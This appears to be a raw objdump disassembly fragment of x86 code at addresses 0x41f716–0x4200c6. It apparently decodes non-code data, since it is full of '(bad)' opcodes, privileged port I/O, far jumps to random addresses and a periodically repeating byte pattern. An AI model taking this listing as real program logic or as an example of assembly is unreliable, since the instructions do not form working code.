  41f716:	xchg   edx,eax
  41f717:	cmp    al,0x23
  41f719:	jle    0x41f6ca
  41f71b:	jg     0x41f6fc
  41f71d:	cld    
  41f71e:	dec    ecx
  41f71f:	loope  0x41f6f2
  41f721:	sbb    DWORD PTR [ecx+0x50],esi
  41f724:	or     esp,0x4a
  41f727:	dec    ebp
  41f728:	add    DWORD PTR [eax],eax
  41f72a:	pop    es
  41f72b:	add    DWORD PTR [eax],eax
  41f72d:	add    BYTE PTR [esi-0x492789fc],dl
  41f733:	pop    edi
  41f734:	(bad)  
  41f735:	daa    
  41f736:	pop    ecx
  41f737:	outs   dx,DWORD PTR ds:[esi]
  41f738:	xchg   edx,eax
  41f739:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f73a:	mov    dl,0x2e
  41f73c:	xchg   ecx,eax
  41f73d:	shl    BYTE PTR [ecx-0x55b15710],1
  41f743:	mov    esi,0x81779daa
  41f748:	adc    eax,0x7c817702
  41f74d:	mov    DWORD PTR [ebx+eax*4+0x818ce40],edi
  41f754:	scas   eax,DWORD PTR es:[edi]
  41f755:	or     DWORD PTR [eax+0x3bbd5a28],edx
  41f75b:	loope  0x41f72f
  41f75d:	pop    ss
  41f75e:	in     eax,dx
  41f75f:	cmp    al,0x8
  41f761:	xchg   BYTE PTR [esi-0x1656c741],dh
  41f767:	jmp    0x92208e70
  41f76c:	push   es
  41f76d:	mov    DWORD PTR [edi-0x2ec31a13],0x9be352bd
  41f777:	mov    BYTE PTR [edi-0x1ac09695],dh
  41f77d:	mov    ecx,edi
  41f77f:	sahf   
  41f780:	test   al,0x23
  41f782:	pop    edi
  41f783:	add    BYTE PTR [edx],al
  41f785:	sti    
  41f786:	test   eax,0x60e18465
  41f78b:	and    eax,0xfec77bbb
  41f790:	adc    al,0xa9
  41f792:	adc    eax,0x52a79d08
  41f797:	xor    ah,BYTE PTR [edx]
  41f799:	adc    eax,0x44465667
  41f79e:	sbb    eax,0xbae8912e
  41f7a3:	fidiv  DWORD PTR [ecx+0x5801d046]
  41f7a9:	dec    edx
  41f7aa:	dec    esi
  41f7ab:	or     ecx,DWORD PTR [edi]
  41f7ad:	call   0xdcb4:0x2c9e46df
  41f7b4:	(bad)  
  41f7b5:	ror    BYTE PTR [ebp+0x3f],0x71
  41f7b9:	out    0x8,eax
  41f7bb:	adc    al,0xc2
  41f7bd:	cmove  ecx,DWORD PTR [ebx+edx*4+0x33]
  41f7c2:	inc    ebx
  41f7c3:	test   eax,0xf8ff9e61
  41f7c8:	mov    ch,0xc
  41f7ca:	sbb    BYTE PTR ds:0xf736d8c7,ch
  41f7d0:	sti    
  41f7d1:	jb     0x41f84e
  41f7d3:	or     ah,cl
  41f7d5:	pop    edx
  41f7d6:	(bad)  
  41f7d7:	retf   0x949b
  41f7da:	and    eax,0x82cd3cc2
  41f7df:	out    0x5d,al
  41f7e1:	pop    esi
  41f7e2:	imul   esp,DWORD PTR [ebx-0x1d3356e1],0xe2df40b0
  41f7ec:	test   eax,0x4b520078
  41f7f1:	in     eax,dx
  41f7f2:	mov    bh,0x42
  41f7f4:	dec    esi
  41f7f5:	arpl   WORD PTR [esi+ecx*1-0x6825a5cc],ax
  41f7fc:	push   es
  41f7fd:	retf   0x2596
  41f800:	dec    BYTE PTR [edx]
  41f802:	test   BYTE PTR [ecx],dl
  41f804:	jge    0x41f7ca
  41f806:	scas   eax,DWORD PTR es:[edi]
  41f807:	imul   edx,ecx,0x496e0c3b
  41f80d:	mov    eax,ds:0x8c36f811
  41f812:	dec    edi
  41f813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f814:	stc    
  41f815:	mov    al,ds:0x14498482
  41f81a:	sbb    DWORD PTR [esp+ebx*1],ebx
  41f81d:	clc    
  41f81e:	pop    edx
  41f81f:	imul   ebx,DWORD PTR [esi+esi*8+0x2bfde0be],0xffffffa1
  41f827:	adc    eax,0xf332acb9
  41f82c:	or     bh,BYTE PTR [edx+0x39]
  41f82f:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f831:	(bad)  
  41f832:	and    eax,DWORD PTR [edi]
  41f834:	mov    ds:0x0,eax
	...
  41f895:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f89b:	xchg   ebx,eax
  41f89c:	mov    ecx,0x25be46bb
  41f8a1:	mov    ebx,DWORD PTR [ecx]
  41f8a3:	ror    BYTE PTR [ebp+eax*4+0x14e51],1
  41f8aa:	pop    es
  41f8ab:	add    DWORD PTR [eax],eax
  41f8ad:	add    BYTE PTR [ebx+0x7f],cl
  41f8b0:	addr16 enter 0x436a,0xd9
  41f8b5:	sbb    BYTE PTR [edx+0x537ddedd],al
  41f8bb:	jb     0x41f8fd
  41f8bd:	push   ebp
  41f8be:	mov    dl,0x52
  41f8c0:	adc    DWORD PTR [ecx],0xfffffffb
  41f8c3:	or     eax,0xee4a8b8b
  41f8c8:	push   0xcfa1a177
  41f8cd:	iret   
  41f8ce:	jo     0x41f8b1
  41f8d0:	pop    ecx
  41f8d1:	lods   eax,DWORD PTR ds:[esi]
  41f8d2:	std    
  41f8d3:	and    ebp,edi
  41f8d5:	and    eax,0xa6621080
  41f8da:	fiadd  DWORD PTR [eax]
  41f8dc:	loopne 0x41f92e
  41f8de:	gs push esp
  41f8e0:	imul   esp,DWORD PTR [edi+0x7639fd38],0x9eb22ddf
  41f8ea:	mov    ah,0x0
  41f8ec:	sbb    ch,0xad
  41f8ef:	cmp    dh,BYTE PTR [ecx-0x2d]
  41f8f2:	sti    
  41f8f3:	retf   0x8629
  41f8f6:	(bad)
  41f8fa:	addr16 and eax,0xeea0a38b
  41f900:	cmp    DWORD PTR [edi],0xc07b2d1
  41f906:	mov    edi,0xfccb3599
  41f90b:	retf   
  41f90c:	sub    eax,0x3271795
  41f911:	push   ebx
  41f912:	addr16 sbb al,0x12
  41f915:	sahf   
  41f916:	(bad)  
  41f917:	shr    ch,0x3b
  41f91a:	pop    ecx
  41f91b:	ret    0xd44c
  41f91e:	inc    ecx
  41f91f:	inc    ebp
  41f920:	sbb    ax,0x1278
  41f924:	push   eax
  41f925:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f926:	jns    0x41f976
  41f928:	mov    ch,0xdb
  41f92a:	dec    ecx
  41f92b:	shl    DWORD PTR [ecx],1
  41f92d:	push   DWORD PTR [ebx]
  41f92f:	rcl    BYTE PTR [eax-0x26],1
  41f932:	call   0xa56f903c
  41f937:	(bad)  
  41f938:	in     al,dx
  41f939:	aaa    
  41f93a:	mov    dl,0x70
  41f93c:	sbb    ebx,DWORD PTR [edx+ebp*1-0x56989900]
  41f943:	pop    esi
  41f944:	cdq    
  41f945:	push   esi
  41f946:	jns    0x41f960
  41f948:	xchg   ecx,eax
  41f949:	cwde   
  41f94a:	and    ah,BYTE PTR [esi+0x63]
  41f94d:	mov    al,0x4b
  41f94f:	add    cl,BYTE PTR [ecx-0x3235de94]
  41f955:	push   edx
  41f956:	xor    DWORD PTR [edi-0x19],ebp
  41f959:	cli    
  41f95a:	mov    ds:0x7be58097,al
  41f95f:	xor    BYTE PTR [esi+ebp*4+0x55c87a00],dh
  41f966:	pop    ds
  41f967:	push   es
  41f968:	or     al,0x29
  41f96a:	mov    eax,0xb0c0d7b
  41f96f:	push   ecx
  41f970:	cs in  eax,dx
  41f972:	add    eax,0x692b0e0b
  41f977:	pop    ds
  41f978:	mov    esp,0x2935083d
  41f97d:	(bad)  
  41f97e:	out    dx,al
  41f97f:	bound  esp,QWORD PTR [ecx+ebx*1-0x43d14815]
  41f986:	inc    edx
  41f987:	push   edi
  41f988:	jle    0x41f9f2
  41f98a:	loopne 0x41fa02
  41f98c:	cmp    ebx,DWORD PTR [esi]
  41f98e:	jns    0x41f9c2
  41f990:	aaa    
  41f991:	int    0x27
  41f993:	and    edx,DWORD PTR [eax]
  41f995:	mov    ebx,0x4eb9c187
  41f99a:	into   
  41f99b:	into   
  41f99c:	mov    al,ds:0xb13984c1
  41f9a1:	pop    es
  41f9a2:	sub    BYTE PTR [edx-0x34],dh
  41f9a5:	xchg   al,bl
  41f9a7:	arpl   bx,si
  41f9a9:	mov    dh,0x2e
  41f9ab:	pushf  
  41f9ac:	or     DWORD PTR [esi],eax
  41f9ae:	mov    bl,0x75
  41f9b0:	pop    ecx
  41f9b1:	nop
  41f9b2:	fidivr DWORD PTR [edi+0x0]
	...
  41fa16:	or     al,BYTE PTR [ecx-0x49]
  41fa19:	mov    eax,ds:0xeb1ef7ff
  41fa1e:	fwait
  41fa1f:	mov    eax,0xfd568e70
  41fa24:	adc    esp,DWORD PTR [eax+ebx*2]
  41fa27:	dec    edi
  41fa28:	add    DWORD PTR [eax],eax
  41fa2a:	pop    es
  41fa2b:	add    DWORD PTR [eax],eax
  41fa2d:	add    bl,dl
  41fa2f:	dec    edi
  41fa30:	xor    ah,BYTE PTR [esp+eax*4]
  41fa33:	fs sti 
  41fa35:	out    0x5b,eax
  41fa37:	dec    ebx
  41fa38:	icebp  
  41fa39:	stos   BYTE PTR es:[edi],al
  41fa3a:	out    0x39,al
  41fa3c:	loope  0x41f9c4
  41fa3e:	test   eax,0x92bf8bd7
  41fa43:	clc    
  41fa44:	or     edx,DWORD PTR [edi+0x6d]
  41fa47:	xchg   ebp,eax
  41fa48:	popa   
  41fa49:	mov    ch,0x54
  41fa4b:	xlat   BYTE PTR cs:[ebx]
  41fa4d:	jne    0x41fa27
  41fa4f:	ss pop esi
  41fa51:	mov    eax,0x301aaf36
  41fa56:	cmp    eax,0x7e230d4e
  41fa5b:	pop    ebp
  41fa5c:	popf   
  41fa5d:	sub    esi,DWORD PTR [edi]
  41fa5f:	stos   BYTE PTR es:[edi],al
  41fa60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa61:	lock in eax,0x5a
  41fa64:	aam    0x76
  41fa66:	in     eax,0xc8
  41fa68:	imul   ebx,DWORD PTR [edx],0x973650c1
  41fa6e:	or     DWORD PTR [ebp-0x1ad22f8],edx
  41fa74:	cmp    bh,BYTE PTR [ecx+0x615fba00]
  41fa7a:	rol    DWORD PTR [ebx+0x66da5f28],1
  41fa80:	cs out 0x3a,al
  41fa83:	call   0xbc53:0x888d97a8
  41fa8a:	jbe    0x41fad2
  41fa8c:	adc    eax,0x17a810f0
  41fa91:	jp     0x41fa2b
  41fa93:	jae    0x41fa5d
  41fa95:	and    ecx,edx
  41fa97:	prefetch BYTE PTR [edi-0x7fa6f641]
  41fa9e:	jmp    0x41fafa
  41faa0:	xor    eax,0x2be69ebe
  41faa5:	add    esp,DWORD PTR [ecx-0x17]
  41faa8:	inc    ecx
  41faa9:	cwde   
  41faaa:	cs stos DWORD PTR es:[edi],eax
  41faac:	(bad)
  41faaf:	loopne 0x41fb02
  41fab1:	pop    ds
  41fab2:	call   0x234f:0x23865ad6
  41fab9:	nop
  41faba:	or     esp,DWORD PTR [edi+0x78315027]
  41fac0:	xchg   BYTE PTR [ebx-0x17],dl
  41fac3:	jmp    FWORD PTR [eax+0x73]
  41fac6:	sbb    ah,BYTE PTR [edx]
  41fac8:	(bad)  
  41fac9:	mov    ss,WORD PTR [ebp+0x27]
  41facc:	sub    bh,dh
  41face:	hlt    
  41facf:	jb     0x41fa62
  41fad1:	xchg   edx,eax
  41fad2:	mov    ch,BYTE PTR [edx-0x40b16533]
  41fad8:	or     al,0x12
  41fada:	inc    ecx
  41fadb:	out    0x6b,eax
  41fadd:	cmp    DWORD PTR [esi+eax*8-0x56057ec2],edx
  41fae4:	test   al,0x2a
  41fae6:	lods   eax,DWORD PTR ds:[esi]
  41fae7:	int3   
  41fae8:	xchg   edi,eax
  41fae9:	dec    eax
  41faea:	jmp    0x41fb41
  41faec:	sbb    al,0x14
  41faee:	xor    edx,DWORD PTR [ebp-0x26db53b8]
  41faf4:	call   edi
  41faf6:	aaa    
  41faf7:	nop
  41faf8:	sti    
  41faf9:	dec    esp
  41fafa:	outs   dx,DWORD PTR ds:[esi]
  41fafb:	out    dx,al
  41fafc:	iret   
  41fafd:	inc    edx
  41fafe:	inc    edi
  41faff:	and    ecx,DWORD PTR [edx-0x1abaef41]
  41fb05:	(bad)  
  41fb06:	popf   
  41fb07:	push   ebp
  41fb08:	shr    BYTE PTR [ebp-0x128a5808],0xaf
  41fb0f:	out    0xc6,al
  41fb11:	mov    eax,0xb81f63b8
  41fb16:	pop    ecx
  41fb17:	cmp    ebx,DWORD PTR [edx-0x40d3a3f]
  41fb1d:	jl     0x41fb1a
  41fb1f:	cmp    al,cl
  41fb21:	push   ebp
  41fb22:	sahf   
  41fb23:	cs (bad) 
  41fb25:	push   edx
  41fb26:	inc    ecx
  41fb27:	test   BYTE PTR [ecx],dh
  41fb29:	mov    eax,ds:0x38a5f04d
  41fb2e:	bound  eax,QWORD PTR [edx+0x5]
  41fb31:	stos   BYTE PTR es:[edi],al
  41fb32:	nop
  41fb33:	icebp  
  41fb34:	xchg   BYTE PTR [eax],al
	...
  41fb96:	fsubr  QWORD PTR [eax]
  41fb98:	mov    ah,ah
  41fb9a:	(bad)  
  41fb9b:	out    0xfe,al
  41fb9d:	cmp    cl,ah
  41fb9f:	cmc    
  41fba0:	push   cs
  41fba1:	adc    al,0x39
  41fba3:	add    al,0x2c
  41fba5:	in     eax,dx
  41fba6:	pop    edi
  41fba7:	push   eax
  41fba8:	add    DWORD PTR [eax],eax
  41fbaa:	pop    es
  41fbab:	add    DWORD PTR [eax],eax
  41fbad:	add    bh,bl
  41fbaf:	mov    BYTE PTR [ebx],bl
  41fbb1:	sub    al,0x6
  41fbb3:	dec    esi
  41fbb4:	jg     0x41fb9d
  41fbb6:	cmp    ebx,DWORD PTR [ebx+0x7e]
  41fbb9:	fimul  DWORD PTR [ebx-0x1e]
  41fbbc:	leave  
  41fbbd:	(bad)  
  41fbbe:	fimul  DWORD PTR [ebx]
  41fbc0:	sbb    BYTE PTR [ebx-0x36],bl
  41fbc3:	inc    ecx
  41fbc4:	bsf    esp,DWORD PTR [esi]
  41fbc7:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41fbc9:	add    ah,bl
  41fbcb:	les    esi,FWORD PTR [edx+0x37]
  41fbce:	pop    es
  41fbcf:	dec    edx
  41fbd0:	neg    BYTE PTR [esi-0x466532f4]
  41fbd6:	push   es
  41fbd7:	xchg   ecx,eax
  41fbd8:	or     esp,DWORD PTR [ebx]
  41fbda:	mov    cl,0xc9
  41fbdc:	add    ebx,edx
  41fbde:	inc    esi
  41fbdf:	adc    DWORD PTR ds:0x285c2d22,0xffffffef
  41fbe6:	jp     0x41fbe2
  41fbe8:	(bad)  
  41fbe9:	out    dx,eax
  41fbea:	sub    DWORD PTR [edi+ecx*2],esp
  41fbed:	and    eax,0x46f6f3f1
  41fbf2:	imul   esp,DWORD PTR [esi+ebx*4-0x2ee96e51],0xc1c4eb22
  41fbfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fbfe:	pop    eax
  41fbff:	inc    ecx
  41fc00:	mov    ds:0x1a3ad6a9,eax
  41fc05:	cmp    al,0x97
  41fc07:	cdq    
  41fc08:	inc    edi
  41fc09:	(bad)  
  41fc0a:	in     eax,dx
  41fc0b:	push   cs
  41fc0c:	mov    ebx,0xe367de70
  41fc11:	xchg   esp,eax
  41fc12:	das    
  41fc13:	sbb    BYTE PTR [esi-0x10656217],ch
  41fc19:	pushf  
  41fc1a:	pop    esp
  41fc1b:	adc    ah,BYTE PTR [edx]
  41fc1d:	jle    0x41fc5a
  41fc1f:	push   cs
  41fc20:	jns    0x41fbb1
  41fc22:	mov    edi,0x5261fce3
  41fc27:	jb     0x41fca5
  41fc29:	push   cs
  41fc2a:	sbb    eax,DWORD PTR [esi+0x30126c7a]
  41fc30:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc31:	sbb    BYTE PTR ds:0xfa781011,dh
  41fc37:	outs   dx,BYTE PTR ds:[esi]
  41fc38:	sti    
  41fc39:	or     esp,esp
  41fc3b:	xchg   edi,eax
  41fc3c:	fistp  DWORD PTR ds:0xcf427749
  41fc42:	fcomp  QWORD PTR [ebx-0x8]
  41fc45:	sbb    eax,0x31b5f6
  41fc4a:	dec    edi
  41fc4b:	push   ds
  41fc4c:	sbb    eax,0x8ce128ec
  41fc51:	dec    esi
  41fc52:	inc    esp
  41fc53:	mov    eax,ds:0x824bbecb
  41fc58:	inc    ebx
  41fc59:	dec    ebp
  41fc5a:	and    edi,DWORD PTR [edi+0x37]
  41fc5d:	xor    esp,DWORD PTR [ebx+0x1709d0d4]
  41fc63:	jmp    0x1ecc:0xccad9dd
  41fc6a:	repz dec esp
  41fc6c:	aad    0x0
  41fc6e:	sbb    esi,DWORD PTR [ebx]
  41fc70:	sbb    ebx,eax
  41fc72:	rcl    esp,cl
  41fc74:	push   0xb0e55756
  41fc79:	xchg   edi,eax
  41fc7a:	idiv   BYTE PTR [edx]
  41fc7c:	cmp    eax,0x60149ca1
  41fc81:	inc    ebp
  41fc82:	test   ch,ch
  41fc84:	sbb    esp,ebx
  41fc86:	out    0x1c,eax
  41fc88:	sub    al,0x4d
  41fc8a:	retf   0xaeca
  41fc8d:	dec    edi
  41fc8e:	bound  edx,QWORD PTR [edx]
  41fc90:	add    DWORD PTR [ebx+edi*4-0x6ba9f937],ebp
  41fc97:	dec    edx
  41fc98:	cld    
  41fc99:	mov    bh,0x81
  41fc9b:	push   ebx
  41fc9c:	es clc 
  41fc9e:	fidiv  DWORD PTR [ebx]
  41fca0:	in     al,dx
  41fca1:	sar    DWORD PTR [ebx+ebp*1+0x48],0xe9
  41fca6:	jae    0x41fc55
  41fca8:	sbb    BYTE PTR [ebx],dh
  41fcaa:	dec    esi
  41fcab:	hlt    
  41fcac:	inc    esi
  41fcad:	stc    
  41fcae:	pop    ds
  41fcaf:	pop    ebp
  41fcb0:	fucomip st,st(6)
  41fcb2:	sbb    BYTE PTR cs:[eax+eax*1+0x0],cl
	...
  41fd13:	add    BYTE PTR [eax],al
  41fd15:	add    BYTE PTR [edx+ebp*2],cl
  41fd18:	push   edx
  41fd19:	shl    DWORD PTR [esi-0x7],0x9f
  41fd1d:	out    dx,eax
  41fd1e:	je     0x41fd3b
  41fd20:	pop    ebp
  41fd21:	inc    edi
  41fd22:	fsub   QWORD PTR [ebx]
  41fd24:	mov    ds:0x151665f,eax
  41fd29:	add    BYTE PTR [edi],al
  41fd2b:	add    DWORD PTR [eax],eax
  41fd2d:	add    BYTE PTR [edx-0x57],bl
  41fd30:	mov    WORD PTR [ecx+0x7705be9d],?
  41fd36:	cli    
  41fd37:	inc    edi
  41fd38:	cvtps2pi mm4,QWORD PTR [ecx+esi*4-0x44ed9afe]
  41fd40:	xor    ah,BYTE PTR [ebx]
  41fd42:	lea    ebx,[edi+0xa59acf5]
  41fd48:	ins    BYTE PTR es:[edi],dx
  41fd49:	lods   eax,DWORD PTR ds:[esi]
  41fd4a:	loop   0x41fcee
  41fd4c:	cwde   
  41fd4d:	sbb    DWORD PTR [esi+0x4eaf430f],ebp
  41fd53:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fd55:	rcl    ah,1
  41fd57:	rcr    BYTE PTR [edx-0x64],1
  41fd5a:	leave  
  41fd5b:	(bad)  
  41fd5c:	cld    
  41fd5d:	mov    ecx,0x717c9f1
  41fd62:	adc    al,ch
  41fd64:	mov    ah,0xe
  41fd66:	or     edi,DWORD PTR [esi]
  41fd68:	jl     0x41fd0c
  41fd6a:	stos   BYTE PTR es:[edi],al
  41fd6b:	push   ebp
  41fd6c:	jo     0x41fdae
  41fd6e:	pop    ebp
  41fd6f:	in     al,0x27
  41fd71:	out    0x72,al
  41fd73:	les    esi,FWORD PTR [edi-0x14acab34]
  41fd79:	xor    DWORD PTR [edi-0x1c],esi
  41fd7c:	mov    BYTE PTR [ecx-0x5987b24b],ch
  41fd82:	jnp    0x41fd94
  41fd84:	dec    eax
  41fd85:	mov    WORD PTR [ecx-0x14],ss
  41fd88:	inc    edi
  41fd89:	cmp    ecx,DWORD PTR [edx]
  41fd8b:	pop    esi
  41fd8c:	xlat   BYTE PTR ds:[ebx]
  41fd8d:	xchg   esp,eax
  41fd8e:	push   es
  41fd8f:	mov    cl,0x9a
  41fd91:	mov    al,ds:0xfde6394c
  41fd96:	loop   0x41fddb
  41fd98:	(bad)  
  41fd99:	pop    es
  41fd9a:	ret    0x1732
  41fd9d:	push   edx
  41fd9e:	or     al,0x94
  41fda0:	(bad)
  41fda3:	inc    esi
  41fda4:	mov    ds:0x3e18dc0,eax
  41fda9:	es retf 0xfaac
  41fdad:	dec    esi
  41fdae:	fidiv  DWORD PTR [ebp-0xe34f133]
  41fdb4:	push   ss
  41fdb5:	lds    eax,FWORD PTR [ebp+0x6a]
  41fdb8:	sahf   
  41fdb9:	cs dec esp
  41fdbb:	adc    eax,0x524a1d3d
  41fdc0:	inc    eax
  41fdc1:	ins    BYTE PTR es:[edi],dx
  41fdc2:	inc    edx
  41fdc3:	into   
  41fdc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdc5:	aas    
  41fdc6:	sub    ah,0x4a
  41fdc9:	call   0x699a:0x6f60d37
  41fdd0:	les    esi,FWORD PTR [ecx]
  41fdd2:	clc    
  41fdd3:	adc    BYTE PTR ds:0xd5f70539,ch
  41fdd9:	mov    ebx,0x341e7c9f
  41fdde:	js     0x41fe21
  41fde0:	hlt    
  41fde1:	xchg   DWORD PTR [ecx-0x581660db],esi
  41fde7:	sub    ebx,DWORD PTR [esi+0x10b74c0e]
  41fded:	test   ch,ah
  41fdef:	mov    al,ds:0x2663319
  41fdf4:	sub    eax,0xdf94546c
  41fdf9:	ss es mov ebp,0xcaa7bc61
  41fe00:	repnz loope 0x41fe05
  41fe03:	mov    ds:0xa320e4f6,eax
  41fe08:	xchg   ebx,eax
  41fe09:	gs dec edi
  41fe0b:	or     ebp,eax
  41fe0d:	xchg   ebp,eax
  41fe0e:	js     0x41fdca
  41fe10:	adc    BYTE PTR [edi],ch
  41fe12:	(bad)  
  41fe13:	aas    
  41fe14:	mov    ecx,0x771f7816
  41fe19:	popf   
  41fe1a:	jecxz  0x41fe49
  41fe1c:	sub    al,0x3d
  41fe1e:	gs and al,dl
  41fe21:	fmul   QWORD PTR [esi-0x51ab09b8]
  41fe27:	mov    dh,BYTE PTR [eax+0x27]
  41fe2a:	and    DWORD PTR [edx+ebp*2+0x2d],esi
  41fe2e:	jne    0x41fe62
  41fe30:	mov    ecx,0x924a472a
	...
  41fe95:	add    BYTE PTR [edx-0x1865ab],ch
  41fe9b:	out    dx,eax
  41fe9c:	call   FWORD PTR [ebp+0x51]
  41fe9f:	lock xor DWORD PTR [edi-0x14],0x6a
  41fea4:	mov    ss,WORD PTR [ebx]
  41fea6:	ins    DWORD PTR es:[edi],dx
  41fea7:	push   edx
  41fea8:	add    DWORD PTR [eax],eax
  41feaa:	pop    es
  41feab:	add    DWORD PTR [eax],eax
  41fead:	add    BYTE PTR [edx+0x70],dh
  41feb0:	ficom  DWORD PTR [ebp-0x71a9684b]
  41feb6:	mov    esp,0xf07e3aa4
  41febb:	jge    0x41fe4a
  41febd:	iret   
  41febe:	sub    eax,0x8ed040f3
  41fec3:	xor    DWORD PTR [ecx+0x3c708465],eax
  41fec9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41feca:	fsub   st,st(7)
  41fecc:	neg    BYTE PTR [edi-0x33]
  41fecf:	ror    DWORD PTR [ecx+0x5e],cl
  41fed2:	scas   al,BYTE PTR es:[edi]
  41fed3:	adc    al,0x68
  41fed5:	inc    ebx
  41fed6:	xor    eax,0x223d0a18
  41fedb:	jecxz  0x41ff4e
  41fedd:	lahf   
  41fede:	xchg   edx,eax
  41fedf:	in     al,dx
  41fee0:	sbb    al,0xbf
  41fee2:	int    0xa9
  41fee4:	loopne 0x41fe8c
  41fee6:	dec    esp
  41fee7:	into   
  41fee8:	test   DWORD PTR [eax+0x47],ecx
  41feeb:	mov    ds:0xc8119dbd,al
  41fef0:	xor    BYTE PTR [edx+eiz*1+0x3754032c],cl
  41fef7:	ja     0x41fee7
  41fef9:	jmp    0x3ebdb041
  41fefe:	dec    edi
  41feff:	cmp    esp,DWORD PTR [esi]
  41ff01:	lods   eax,DWORD PTR ds:[esi]
  41ff02:	icebp  
  41ff03:	popf   
  41ff04:	mov    esp,0x3dab679e
  41ff09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff0a:	(bad)  
  41ff0b:	xor    dh,ch
  41ff0d:	mov    al,ds:0x861c12c9
  41ff12:	lahf   
  41ff13:	add    dh,BYTE PTR [ebx]
  41ff15:	ss or  al,0xa8
  41ff18:	jecxz  0x41ff26
  41ff1a:	shl    DWORD PTR [ecx],1
  41ff1c:	out    0xf2,eax
  41ff1e:	jmp    0xf276:0xbe343d61
  41ff25:	inc    ecx
  41ff26:	jnp    0x41ff46
  41ff28:	call   0x613e2a97
  41ff2d:	ins    DWORD PTR es:[edi],dx
  41ff2e:	jns    0x41ff20
  41ff30:	push   0xe42647ff
  41ff35:	outs   dx,BYTE PTR ds:[esi]
  41ff36:	stos   DWORD PTR es:[edi],eax
  41ff37:	loopne 0x41fec4
  41ff39:	push   0x3f
  41ff3b:	jle    0x41ffaf
  41ff3d:	xchg   ecx,eax
  41ff3e:	inc    edi
  41ff3f:	adc    eax,DWORD PTR [ebp-0x6a0b8d8c]
  41ff45:	sub    al,0xbb
  41ff47:	(bad)  
  41ff48:	and    DWORD PTR [edx+eiz*2-0x37],ebp
  41ff4c:	les    esp,FWORD PTR [edx+0x48]
  41ff4f:	mov    al,ds:0xfdb2eebb
  41ff54:	or     eax,DWORD PTR [edx]
  41ff56:	inc    edi
  41ff57:	xchg   esp,eax
  41ff58:	xor    edi,eax
  41ff5a:	in     eax,0x62
  41ff5c:	pushf  
  41ff5d:	icebp  
  41ff5e:	jle    0x41ff2c
  41ff60:	jo     0x41ff98
  41ff62:	into   
  41ff63:	dec    ebp
  41ff64:	inc    edi
  41ff65:	cwde   
  41ff66:	xchg   edx,eax
  41ff67:	not    al
  41ff69:	jnp    0x41ff00
  41ff6b:	sbb    eax,DWORD PTR [eax+0x317e658f]
  41ff71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff72:	sub    al,0xed
  41ff74:	or     ebx,DWORD PTR [ebx]
  41ff76:	je     0x41ffd1
  41ff78:	ror    DWORD PTR [esi+0x3b],0x88
  41ff7c:	(bad)
  41ff80:	sub    ebp,DWORD PTR [esi]
  41ff82:	inc    ebx
  41ff83:	mov    bh,0x49
  41ff85:	shr    DWORD PTR [edi-0x7ab83de4],cl
  41ff8b:	arpl   WORD PTR [eax+0x5],cx
  41ff8e:	jp     0x41ffa7
  41ff90:	xchg   ebp,eax
  41ff91:	or     eax,DWORD PTR [eax+0x678b52b7]
  41ff97:	imul   ebp,DWORD PTR ds:0x8f7753d2,0x3b426816
  41ffa1:	bound  eax,QWORD PTR [ecx-0x15120039]
  41ffa7:	ficom  WORD PTR [ebp+0x7669f898]
  41ffad:	pop    edi
  41ffae:	and    eax,0x3624f0c4
  41ffb3:	repnz test al,0x0
	...
  420016:	bound  esp,QWORD PTR [ebp-0x8808a]
  42001c:	imul   edi,DWORD PTR [ebp-0x2ab923c6],0xffffffbd
  420023:	adc    DWORD PTR [eax-0xf],edx
  420026:	je     0x42007b
  420028:	add    DWORD PTR [eax],eax
  42002a:	pop    es
  42002b:	add    DWORD PTR [eax],eax
  42002d:	add    BYTE PTR [esi-0x40],ch
  420030:	mov    BYTE PTR [edx+0x792d550],bl
  420036:	rol    edx,0xb0
  420039:	shr    DWORD PTR [ebx+eiz*1+0x1a1f5fc9],1
  420040:	ret    
  420041:	test   al,0x2e
  420043:	sub    BYTE PTR [ecx],dh
  420045:	pop    edx
  420046:	xchg   esp,eax
  420047:	or     DWORD PTR [ecx-0x695d584c],esp
  42004d:	sbb    edx,DWORD PTR [ecx-0x1eec6eb1]
  420053:	xchg   esi,eax
  420054:	jmp    0x799104dc
  420059:	xor    al,BYTE PTR [ecx]
  42005b:	mov    bl,BYTE PTR [eax]
  42005d:	xchg   esp,esi
  42005f:	mov    esi,0x16a4eada
  420064:	push   eax
  420065:	or     al,0x6
  420067:	or     ecx,DWORD PTR [edi]
  420069:	cmp    BYTE PTR [edx-0x33e21eca],0xdf
  420070:	daa    
  420071:	adc    eax,0x52cdc54
  420076:	push   cs
  420077:	pop    es
  420078:	sub    eax,0xfa65461d
  42007d:	mov    cs,WORD PTR [esi]
  42007f:	imul   ecx,esp,0x6e
  420082:	test   eax,0x3d6bfba4
  420087:	mov    bl,0xd7
  420089:	iret   
  42008a:	and    bh,BYTE PTR [eax-0x35]
  42008d:	in     eax,dx
  42008e:	cmp    bl,BYTE PTR [ecx]
  420090:	pop    esp
  420091:	mov    bh,0x29
  420093:	push   es
  420094:	push   esi
  420095:	xor    DWORD PTR [ebp+0x7e22ed5],ebp
  42009b:	pop    ebp
  42009c:	data16 mov WORD PTR [eiz*2-0x3da9eb49],gs
  4200a4:	dec    ebx
  4200a5:	outs   dx,BYTE PTR ds:[esi]
  4200a6:	sbb    al,0x23
  4200a8:	inc    edx
  4200a9:	stos   BYTE PTR es:[edi],al
  4200aa:	(bad)  
  4200ab:	lock scas al,BYTE PTR es:[edi]
  4200ad:	push   ds
  4200ae:	jle    0x4200ab
  4200b0:	call   0xca5e065f
  4200b5:	adc    DWORD PTR [edx+0x4b],0xcdfa31d0
  4200bc:	push   esp
  4200bd:	test   eax,0x7822b80c
  4200c2:	or     al,0x6b
  4200c4:	jmp    0x4200d1
  4200c6:	lea    ebp,[ecx+0x23]
